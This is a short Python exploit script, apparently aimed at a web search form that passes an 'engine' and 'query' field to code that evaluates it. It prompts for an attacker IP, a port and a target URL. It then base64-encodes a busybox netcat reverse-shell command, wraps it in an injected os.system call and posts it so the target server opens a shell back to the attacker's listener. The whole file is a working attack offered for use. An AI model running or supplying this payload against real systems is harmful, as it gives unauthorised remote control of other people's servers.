#!python
import base64
import requests
import time
import sys

print("Please start a netcat listener.")

ipaddress = input("What is your IP address? ")
port = input("What port is the listener using? ")
target = input("What's the target URL for the post form? For example: https://test.com/search ")

#Change the exploit code in payload if you want to use something that is not Busybox.
payload = ("busybox nc " + ipaddress + " " + port + " " + "-e bash")
payloadbyte = payload.encode('utf-8')
encodedpayload = base64.b64encode(payloadbyte).decode('utf-8')
exploitcode = ("', __import__('os').system('echo " + encodedpayload + " | base64 -d | bash -i')) \\")
exploitcode2 = exploitcode.replace("\\","#")

print(exploitcode2)

postdata = {
    	'engine': "Amazon",
    	'query': exploitcode2
}

print("Now sending a busybox payload that should call back to your listener at port " + port + ".")
response = requests.post(target, data = postdata)
time.sleep(3)
sys.exit()
